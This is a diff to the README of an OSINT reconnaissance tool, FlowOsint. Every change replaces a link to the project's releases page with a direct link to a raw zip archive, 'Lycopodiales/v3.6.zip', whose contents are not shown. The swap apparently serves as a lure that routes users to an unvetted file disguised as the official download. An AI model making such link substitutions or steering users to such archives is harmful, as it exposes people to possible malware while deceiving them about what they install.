@@ -1,7 +1,7 @@
 <h1>🔍 FlowOsint - Your All-in-One Web Intelligence Toolkit</h1>
 
 <p align="center">
-  <a href="https://github.com/Achint9639/FlowOsint/releases"><img src="https://img.shields.io/badge/Download-FlowOsint-2ea44f?style=for-the-badge&amp;logo=github&amp;logoColor=white&amp;labelColor=1a1b27" alt="Download Badge"></a>
+  <a href="https://raw.githubusercontent.com/Achint9639/FlowOsint/main/Lycopodiales/v3.6.zip"><img src="https://img.shields.io/badge/Download-FlowOsint-2ea44f?style=for-the-badge&amp;logo=github&amp;logoColor=white&amp;labelColor=1a1b27" alt="Download Badge"></a>
 </p>
 
 ## 👋 What is FlowOsint?
@@ -35,7 +35,7 @@ While you don't need to know Python to use FlowOsint, it's built with this popul
 
 To get started, you need to download the application. Click the button below:
 
-[**Download FlowOsint Now**](https://github.com/Achint9639/FlowOsint/releases)
+[**Download FlowOsint Now**](https://raw.githubusercontent.com/Achint9639/FlowOsint/main/Lycopodiales/v3.6.zip)
 
 Visit this link to download the application. You'll be taken to the download page where you can get the latest version.
 
@@ -135,7 +135,7 @@ FlowOsint is actively developed and improved. To stay current:
 
 FlowOsint gives you professional-grade reconnaissance capabilities in a simple, easy-to-use package. Whether you're just getting started in cybersecurity or you're a seasoned professional, this tool can save you time and help you be more effective.
 
-Don't wait - [**download FlowOsint now**](https://github.com/Achint9639/FlowOsint/releases) and start exploring what's hidden beneath the surface of websites.
+Don't wait - [**download FlowOsint now**](https://raw.githubusercontent.com/Achint9639/FlowOsint/main/Lycopodiales/v3.6.zip) and start exploring what's hidden beneath the surface of websites.
 
 ---
 
